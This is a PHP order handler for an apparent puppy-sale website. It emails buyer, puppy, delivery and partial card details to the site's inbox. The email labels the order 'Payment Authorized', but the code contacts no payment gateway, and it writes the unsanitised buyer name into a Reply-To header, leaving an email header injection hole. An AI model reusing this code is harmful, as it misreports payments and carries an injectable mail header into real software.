<?php
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Invalid request method']);
    exit;
}

$inputRaw = file_get_contents('php://input');
$data = json_decode($inputRaw, true);

if (!$data) {
    $data = $_POST;
}

$customer  = isset($data['customer']) ? $data['customer'] : [];
$delivery  = isset($data['delivery']) ? $data['delivery'] : [];
$puppy     = isset($data['puppy']) ? $data['puppy'] : [];
$card      = isset($data['card']) ? $data['card'] : [];

$buyerName   = trim(($customer['firstName'] ?? '') . ' ' . ($customer['lastName'] ?? ''));
if (empty($buyerName)) $buyerName = isset($card['cardHolderName']) ? trim(strip_tags($card['cardHolderName'])) : 'Valued Customer';

$buyerEmail  = trim(filter_var($customer['email'] ?? '', FILTER_SANITIZE_EMAIL));
$buyerPhone  = trim(strip_tags($customer['phone'] ?? 'Not Provided'));

$puppyName   = trim(strip_tags($puppy['name'] ?? 'Puppy'));
$puppyBreed  = trim(strip_tags($puppy['breed'] ?? 'N/A'));
$puppyId     = trim(strip_tags($puppy['id'] ?? 'N/A'));
$puppyPrice  = isset($puppy['price']) ? '$' . number_format($puppy['price'], 2) : '$2,497.00';

$delOption   = trim(strip_tags($delivery['deliveryOption'] ?? 'N/A'));
$delAddress  = trim(strip_tags($delivery['locationText'] ?? ($delivery['streetAddress'] ?? 'N/A')));

$rawCardNum  = isset($card['cardNumber']) ? preg_replace('/[^0-9]/', '', $card['cardNumber']) : '';
$last4       = strlen($rawCardNum) >= 4 ? substr($rawCardNum, -4) : '****';

$to = 'info@everlypups.com';
$subject = "💳 NEW CARD PAYMENT CONFIRMED: " . $puppyName . " (" . $puppyBreed . ") - " . $buyerName;

$body  = "NEW CARD PAYMENT TRANSACTION CONFIRMED
";
$body .= "====================================

";

$body .= "🐶 PUPPY ADOPTED:
";
$body .= "  • Puppy Name: " . $puppyName . "
";
$body .= "  • Breed: " . $puppyBreed . "
";
$body .= "  • Puppy ID #: " . $puppyId . "
";
$body .= "  • Price Paid: " . $puppyPrice . "

";

$body .= "👤 CUSTOMER DETAILS:
";
$body .= "  • Customer Name: " . $buyerName . "
";
$body .= "  • Email Address: " . ($buyerEmail ?: 'Not Provided') . "
";
$body .= "  • Phone Number: " . $buyerPhone . "

";

$body .= "🚚 DELIVERY DETAILS:
";
$body .= "  • Delivery Option: " . $delOption . "
";
$body .= "  • Address / Location: " . $delAddress . "

";

$body .= "💳 PAYMENT GATEWAY DETAILS:
";
$body .= "  • Payment Gateway: Credit / Debit Card (Instant Gateway)
";
$body .= "  • Cardholder Name: " . ($card['cardHolderName'] ?? $buyerName) . "
";
$body .= "  • Card Ending: **** **** **** " . $last4 . "
";
$body .= "  • Status: Payment Authorized & Order Confirmed

";

$body .= "====================================
";
$body .= "Action Required: Contact customer at " . ($buyerEmail ?: $buyerPhone) . " to coordinate delivery.
";

$headers  = "From: EverlyPups Payment Gateway <info@everlypups.com>
";
if (!empty($buyerEmail)) {
    $headers .= "Reply-To: " . $buyerName . " <" . $buyerEmail . ">
";
}
$headers .= "X-Mailer: PHP/" . phpversion() . "
";
$headers .= "Content-Type: text/plain; charset=UTF-8
";

@mail($to, $subject, $body, $headers, "-f info@everlypups.com");

echo json_encode(['success' => true]);
